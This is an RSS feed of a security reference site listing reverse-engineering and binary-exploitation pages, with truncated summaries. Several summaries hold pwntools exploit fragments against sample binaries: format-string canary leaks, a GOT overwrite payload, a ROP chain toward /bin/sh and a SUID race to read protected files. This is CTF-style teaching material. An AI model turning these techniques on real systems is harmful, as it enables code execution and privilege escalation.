<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Reverse Engineering on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/tags/reverse-engineering/</link>
    <description>Recent content in Reverse Engineering on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 06 Dec 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://documentnation.github.io/tags/reverse-engineering/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>WinDBG Command Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/windbg-command-cheat-sheet/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/windbg-command-cheat-sheet/</guid>
      <description>Common link # Get PEB (Process Environment Block) !peb # Display stack backtrace kv dt (Display Type) linkDisplay fields and values.&#xA;# TEB (Thread Environment Block) dt _teb # PEB (Process Environment Block) dt _peb # @$peb: Refer to the PEB of the current process. dt _peb @$peb # LDR dt _PEB_LDR_DATA # poi: Dereference dt _PEB_LDR_DATA poi(@$peb&amp;#43;0x123) dt _LDR_DATA_TABLE_ENTRY dt _LDR_DATA_TABLE_ENTRY 0x123 ? (Evaluate Expression) link ? poi(@$peb&amp;#43;0x123) </description>
    </item>
    <item>
      <title>Reverse Engineering with GDB</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/reverse-engineering-with-gdb/</link>
      <pubDate>Wed, 15 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/reverse-engineering-with-gdb/</guid>
      <description>Using Enhanced GDB linkIt&amp;rsquo;s recommended to use enhanced version of GDB such as GEF. These have some extended features.&#xA;Start Debugger link chmod &amp;#43;x ./example gdb ./example Commands in GDB linkDebug link # Start the program run r # Continue until the next breakpoint or the end continue c # Execute the next line of code but do not enter any function calls on that line. next n # Execute the next line of code step s # Jump to specific address j *0x01234 Disassemble link # Disassemble the main function disass main Breakpoints link # Set a breakpoint at a specified line number, function, or address.</description>
    </item>
    <item>
      <title>PE (Portable Executable) Analysis</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</guid>
      <description>Investigation link file example.exe strings example.exe PE Headers linkThere are many tools to analyze PE headers, such as wxHexEditor, pe-tree.&#xA;pe-tree is a tool that views PE files in a tree-view. It will take about a few minutes to open.&#xA;pe-tree ./executable Structure Description IMAGE_DOS_HEADER It consists of the first 64 bytes of the PE file. The first two bytes (”4D 5A”) means the “MZ” characters which are an identity of the Portable Executable format.</description>
    </item>
    <item>
      <title>JAR File Analysis</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/jar-file-analysis/</link>
      <pubDate>Fri, 15 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/jar-file-analysis/</guid>
      <description>Analyze Jar File linkWe can use jdgui GUI tool.&#xA;jd-gui </description>
    </item>
    <item>
      <title>Binary Exploitation with Buffer Overflow</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-buffer-overflow/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-buffer-overflow/</guid>
      <description>Investigation linkFunctions Lead to Buffer Overflow linkIf the binary uses the following functions, Buffer Overflow may occurs.&#xA;gets() fgets() scanf() sprintf() strcpy() strcat() Basic Buffer Overflow linkTry to find what values lead to segmentation fault.&#xA;python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*30)&amp;#39; | ./example python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*40)&amp;#39; | ./example python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*50)&amp;#39; | ./example ... Exploitation linkAbuse input/output by typing a lot of characters more than the program expects..&#xA;./example Type something: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Exploitation using Pwntools link #!</description>
    </item>
    <item>
      <title>Binary Exploitation with Format String</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-format-string/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-format-string/</guid>
      <description>Investigation linkIf a binary file contains the functionality which reads user input then outputs it, we can abuse format strings.&#xA;// example.c int main() { char buffer[12]; gets(buffer); printf(buffer); return 0; } For example, input %x as below, then we get the value of stack as hex representation.&#xA;./example # Input 1 (read value as hex) %x # output ad8c72a1 # Input 2 (read multiple values as hex) %x %x %x %x # output 78252078 0 ceddc980 447c8d80 0 # Input 3 (read offset values as hex) %1$x # output 2431 # Input 4 (read offset values as hex) %2$x # output 0 # Input 5 (read pointer address) %p # output 0x55821afca2a1 # Input 6 (read offset pointer address) %1$p # output 2431 Exploitation linkThis is an example of exploitation with format string.</description>
    </item>
    <item>
      <title>Binary Exploitation with ret2libc</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2libc/</link>
      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2libc/</guid>
      <description>Exploitation link1. ASLR Bypass linkFirst check the ASLR in the machine.&#xA;cat /proc/sys/kernel/randomize_va_space If we get &amp;ldquo;2&amp;rdquo; as the result, the machine randomizes the address space so we cannot find the address of the system function. That’s why we need to bypass ASLR to find the address of the function in libc.&#xA;To disable ASLR, run the following command if we can (because it requires sudo).&#xA;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 2.</description>
    </item>
    <item>
      <title>x86 Assembly</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/x86-assembly/</link>
      <pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/x86-assembly/</guid>
      <description>Registers linkConsists of 8 bytes.&#xA;Also, it can be broken down into small segments.&#xA;For example, RAX (64 bits) → EAX (32 bits) → AX (16 bits) → AH (high 8 bits), AL (low 8 bits).&#xA;General Purpose Registers linkThey are used for temporarily storing data.&#xA;EAX/RAX (Accumulator Register)&#xA;It is used to store values (especially, a return value). It&amp;rsquo;s like a variable in high-level programming languages.&#xA;It’s usually used to pass the system call(e.</description>
    </item>
    <item>
      <title>Reverse Engineering with Rizin</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/reverse-engineering-with-rizin/</link>
      <pubDate>Sun, 30 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/reverse-engineering-with-rizin/</guid>
      <description>Using Cutter linkCutter is a GUI tool for reverse engineering powered by Rizin.&#xA;It can also have a decompiler, so it’s recommended to use it first.&#xA;cutter &amp;lt;file&amp;gt; To use the Ghidra decompiler, install the package.&#xA;sudo apt install rizin-plugin-ghidra # or sudo apt install rz-ghidra Start Debugging link rizin ./example # Debug mode rizin -d ./example # Write mode rizin -w ./example Analyze linkAnalyze the program after starting the debugger.</description>
    </item>
    <item>
      <title>Pwntools Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/pwntools-cheat-sheet/</link>
      <pubDate>Fri, 28 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/pwntools-cheat-sheet/</guid>
      <description>from pwn import * # Enable logging context.log_level = &amp;#39;debug&amp;#39; # Load executable exe = ELF(&amp;#34;./example&amp;#34;) # Libc libc = exe.libc sh_addr = next(libc.search(b&amp;#34;/bin/sh&amp;#34;)) # Runtime variables context.arch = &amp;#34;amd64&amp;#34; context.binary = &amp;#34;./example&amp;#34; context.os = &amp;#34;linux&amp;#34; context.update(arch=&amp;#34;amd64&amp;#34;, os=&amp;#34;linux&amp;#34;) # Start process conn = process(&amp;#34;./example&amp;#34;) # local file conn = process(exe.path) # also we can specify the executable path conn = remote(&amp;#34;10.0.0.1&amp;#34;, &amp;#34;1337&amp;#34;) # remote connection # Receive data conn.recv() conn.</description>
    </item>
    <item>
      <title>Firmware Analysis</title>
      <link>https://documentnation.github.io/docs/hdks/hardware/firmware-analysis/</link>
      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/hardware/firmware-analysis/</guid>
      <description>Static Analysis linkThe following tools are useful for static analysis.&#xA;Firmwalker firmware-mod-kit file ./firmware binwalk ./firmware # -M: Matryosika (recursively) scan extracted files # -r: Delete carved files after extracting # -e: Extract known file types binwalk -Mre ./firmware # -E: Calculate file entropy # -N: Do not generate an entropy plot graph binwalk -EN ./firmware # firmware-mod-kit ./extract-firmware.sh ./firmware Dynamic Analysis link gdb ./firmware rizin ./firmware Using FIRMADYNE linkFIRMADYNE is a platform for emulation and dynamic analysis of Linux-based firmware.</description>
    </item>
    <item>
      <title>Binary Exploitation with Race Conditions</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-race-conditions/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-race-conditions/</guid>
      <description>Abuse User Input Method linkIf the SUID binary waits for our input the function like getchar or scanf, we can manipulate the state for something while the binary is waiting for our input.&#xA;puts(&amp;#34;Enter: &amp;#34;); getchar(); Here is an example for reading arbitrary file which cannot be read by current user.&#xA;Exploitation linkAssume the binary reads contents of the file which is passed in the argument as below.&#xA;./suid_binary_to_read_file &amp;lt;file_path&amp;gt; First off, create arbitrary file to read, then execute the binary with passing the file.</description>
    </item>
    <item>
      <title>Reverse Engineering with Angr</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/reverse-engineering-with-angr/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/reverse-engineering-with-angr/</guid>
      <description>Installation linkIt’s recommended to create a Python virtual environment.&#xA;python3 -m venv myenv source myenv/bin/activate pip3 install angr pip3 install monkeyhex Basic Usage link import angr, monkeyhex proj = angr.Project(&amp;#39;/bin/id&amp;#39;) proj = angr.Project(&amp;#39;/bin/id&amp;#39;, load_options={&amp;#39;auto_load_libs&amp;#39;: False}) # Basic information proj.arch proj.entry proj.filename # The loader proj.loader proj.loader.all_objects proj.loader.shared_objects proj.loader.min_addr proj.loader.max_addr # Objects obj = proj.loader.main_object obj.entry obj.min_addr, obj.max_addr addr = obj.plt[&amp;#39;strcmp&amp;#39;] obj.reserve_plt[addr] # Blocks block = proj.factory.block(proj.entry) block.pp() # pretty-print a disassembly to stdout block.</description>
    </item>
    <item>
      <title>Binary Exploitation with Time Guessing</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-time-guessing/</link>
      <pubDate>Wed, 01 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-time-guessing/</guid>
      <description>Investigation link ./example Guess the number: 1111 You losed. The correct answer is 1475693029 Guess the number: 12345678 You losed. The correct answer is 8246712747 If we find a binary that asks us to guess the correct time (or time-base number), we can bypass it using a Pipe in command line.&#xA;Exploitation link # tr -dc &amp;#39;0-9&amp;#39;: Extract the correct number provided by the binary. echo 1234 | ./example | tr -dc &amp;#39;0-9&amp;#39; | .</description>
    </item>
    <item>
      <title>Binary Exploitation with Canary Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-canary-bypass/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-canary-bypass/</guid>
      <description>Exploitation link from pwn import * import re context.update(arch=&amp;#34;amd64&amp;#34;, os=&amp;#34;linux&amp;#34;) filepath = &amp;#34;./example&amp;#34; elf = context.binary = ELF(filepath) p = process(filepath) # p = remote(&amp;#39;example.com&amp;#39;, &amp;#39;1337&amp;#39;) for remote connection # We need to find the stack canary. This address ends with &amp;#34;00&amp;#34;. # To find it, execute p.sendline(b&amp;#34;%p %p %p %p ...&amp;#34;). p.sendline(b&amp;#34;%10$p %13$p&amp;#34;) p.recvuntil(b&amp;#34;result: &amp;#34;) leaked = p.recvline().split() print(leaked) base = int(leaked[0], 16) - 0xa90 canary = int(leaked[1], 16) elf.</description>
    </item>
    <item>
      <title>Binary Exploitation with GOT</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-got/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-got/</guid>
      <description>GOT Overriding link from pwn import * context.update(arch=&amp;#34;amd64&amp;#34;, os=&amp;#34;linux&amp;#34;) filepath = &amp;#34;./example&amp;#34; elf = context.binary = ELF(filepath) p = process(filepath) # p = remote(&amp;#39;example.com&amp;#39;, &amp;#39;1337&amp;#39;) p.clean() p.sendline() p.clean() payload = fmtstr_payload(10, {elf.got[&amp;#39;puts&amp;#39;] : elf.sym[&amp;#39;holidays&amp;#39;]}) p.sendline(payload) p.interactive() </description>
    </item>
    <item>
      <title>Binary Exploitation with ret2plt</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2plt/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-ret2plt/</guid>
      <description>No content yet.</description>
    </item>
    <item>
      <title>Binary Exploitation with ROP</title>
      <link>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-rop/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/binary-exploitation/binary-exploitation-with-rop/</guid>
      <description>Exploitation linkPwntools can build ROP chains so we&amp;rsquo;ll use it for exploitation.&#xA;from pwn import * elf = context.binary = ELF(&amp;#39;./example&amp;#39;) libc = elf.libc p = process() # get the base address p.recvuntil(&amp;#39;Enter name: &amp;#39;) base_addr = int(p.recvline(), 16) # set our libc address according to the base address libc.address = base_addr - libc.sym[&amp;#39;system&amp;#39;] log.success(&amp;#39;LIBC base: {}&amp;#39;.format(hex(libc.address))) # get location of binsh from libc binsh = next(libc.search(b&amp;#39;/bin/sh&amp;#39;)) # build the rop chain rop = ROP(libc) rop.</description>
    </item>
    <item>
      <title>PYC (Python Compiled File) Reverse Engineering</title>
      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/pyc-reverse-engineering/</link>
      <pubDate>Wed, 01 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/pyc-reverse-engineering/</guid>
      <description>Decompile linkuncompyle6 is a PYC decompiler.&#xA;We can install easily using pip.&#xA;pip install uncompyle6 Then decompile the pyc file.&#xA;uncompyle6 example.pyc </description>
    </item>
    <item>
      <title>Android Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/mobile/android/android-pentesting/</link>
      <pubDate>Fri, 30 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/mobile/android/android-pentesting/</guid>
      <description>APK Analysis link1. Extract APK File to DEX File linkYou can retrieve &amp;ldquo;classes.dex&amp;rdquo;.&#xA;unzip example.apk -d ./Example Now you can observe files.&#xA;For React Native, it may contain the sensitive information in the bundle file.&#xA;strings assets/index.android.bundle 2. Convert DEX to JAR linkYou can retrieve JAR file.&#xA;d2j-dex2jar classes.dex 3. Observation linkJD-GUI is a JAVA decompiler tool. It reveals class in the JAR file.&#xA;Open JD-GUI.&#xA;jd-gui Static Analysis link # Decode APK file apktool d example.</description>
    </item>
  </channel>
</rss>
